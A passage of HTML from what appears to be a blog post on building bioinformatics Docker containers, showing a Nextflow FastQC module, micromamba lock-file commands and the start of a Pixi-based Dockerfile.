87%, 60%)">=</span><span class="token plain"> reads </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">instanceof</span><span class="token plain"> </span><span class="token class-name" style="color:hsl(35, 99%, 36%)">Path</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">reads</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">extension</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">withIndex</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">collect </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> entry</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> index </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> entry</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">_</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">index </span><span class="token interpolation-string interpolation expression operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token interpolation-string interpolation expression"> </span><span class="token interpolation-string interpolation expression number" style="color:hsl(35, 99%, 36%)">1</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">entry</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">extension</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> rename_to     </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> old_new_pairs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*.</span><span class="token function" style="color:hsl(221, 87%, 60%)">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> renamed_files </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> old_new_pairs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">collect</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> _old_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> new_name </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-&gt;</span><span class="token plain"> new_name </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// The total amount of allocated RAM by FastQC is equal to the number of threads defined (--threads) time the amount of RAM defined (--memory)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// https://github.com/s-andrews/FastQC/blob/1faeea0412093224d7f6a07f777fad60a5650795/fastqc#L211-L222</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Dividing the task.memory by task.cpu allows to stick to requested amount of RAM in the label</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">memory</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">toUnit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'MB'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">cpus </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> null</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// FastQC memory value allowed range (100 - 10000)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> fastqc_memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> memory_in_mb</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    printf "%s %s\\n" </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">rename_to</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> | while read old_name new_name; do</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        [ -f "\${new_name}" ] || ln -s \$old_name \$new_name</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    done</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    fastqc \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">args</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        --threads </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">cpus</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        --memory </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">fastqc_memory</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">renamed_files</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        fastqc: \$( fastqc --version | sed '/FastQC v/!d; s/.*v//' )</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    stub</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    touch </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    touch </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.zip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        fastqc: \$( fastqc --version | sed '/FastQC v/!d; s/.*v//' )</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="advantages-of-this-approach">Advantages of This Approach<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#advantages-of-this-approach" class="hash-link" aria-label="Direct link to Advantages of This Approach" title="Direct link to Advantages of This Approach" translate="no">​</a></h3>
<table><thead><tr><th>Feature</th><th>conda.yml + Micromamba</th><th>Traditional Conda Dockerfile</th></tr></thead><tbody><tr><td><strong>Build speed</strong></td><td>Very fast (10-100x)</td><td>Slow</td></tr><tr><td><strong>Image size</strong></td><td>~200MB for tools</td><td>~1-2GB</td></tr><tr><td><strong>Reproducibility</strong></td><td>Explicit lock file</td><td>Dependency drift possible</td></tr><tr><td><strong>Version pinning</strong></td><td>Easy in YAML</td><td>Inline in Dockerfile</td></tr><tr><td><strong>Readability</strong></td><td>Clear, readable YAML</td><td>Complex RUN statements</td></tr><tr><td><strong>Channel support</strong></td><td>Multiple channels</td><td>Limited</td></tr><tr><td><strong>Maintenance</strong></td><td>Update conda.yml easily</td><td>Rebuild entire Dockerfile</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="saving-and-sharing-explicit-lock-files">Saving and Sharing Explicit Lock Files<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#saving-and-sharing-explicit-lock-files" class="hash-link" aria-label="Direct link to Saving and Sharing Explicit Lock Files" title="Direct link to Saving and Sharing Explicit Lock Files" translate="no">​</a></h3>
<p>The generated <code>environment.lock</code> file is extremely valuable. Save it in your project:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract from build output and save</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-A</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1000</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"CONDA_LOCK_START"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-B</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1000</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"CONDA_LOCK_END"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> environment.lock</span><br></span></code></pre></div></div>
<p>Later, reproduce the exact environment:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Rebuild from locked versions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">micromamba </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-y</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> base </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--file</span><span class="token plain"> environment.lock</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pixi-the-next-generation-tool-for-conda-based-containers">Pixi: The Next Generation Tool for Conda-Based Containers<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#pixi-the-next-generation-tool-for-conda-based-containers" class="hash-link" aria-label="Direct link to Pixi: The Next Generation Tool for Conda-Based Containers" title="Direct link to Pixi: The Next Generation Tool for Conda-Based Containers" translate="no">​</a></h3>
<p>Pixi is an emerging tool that combines the best aspects of Conda, Mamba, and lock file management into a single, ultra-fast solution. It's gaining traction in bioinformatics for building reproducible containers.</p>
<p><strong>Why Pixi?</strong></p>
<ul>
<li class=""><strong>Fastest:</strong> Even faster than Micromamba for dependency resolution</li>
<li class=""><strong>Automatic lock files:</strong> Lock files are created automatically, no manual export needed</li>
<li class=""><strong>Single-step reproducibility:</strong> One tool handles everything from installation to reproducibility</li>
<li class=""><strong>Cross-platform:</strong> Works seamlessly across different architectures and systems</li>
<li class=""><strong>Modern approach:</strong> Designed from scratch with containerization in mind</li>
</ul>
<p><strong>Example Dockerfile with Pixi:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ARG</span><span class="token instruction"> PIXI_VERSION=0.63.2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ARG</span><span class="token instruction"> BASE_IMAGE=debian:bookworm-slim</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--platform</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">linux/amd64</span><span class="token instruction"> ubuntu:24.04 </span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">AS</span><span class="token instruction"> builder</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ARG</span><span class="token instruction"> PIXI_VERSION</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; apt-get install -y curl</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> curl -Ls </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"https://github.com/prefix-dev/pixi/releases/download/v${PIXI_VERSION}/pixi-$(uname -m)-unknown-linux-musl"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    -o /pixi &amp;&amp; chmod +x /pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> /pixi --version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--platform</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">linux/amd64</span><span class="token instruction"> </span><span class="token instruction variable" style="color:hsl(221, 87%, 60%)">$BASE_IMAGE</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add appuser with UID 1000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> useradd -u 1000 -m -s /bin/bash appuser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> appuser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /home/appuser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy pixi from builder</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--from</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">builder</span><span class="token instruction options"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">appuser:appuser</span><span class="token instruction options"> </span><span 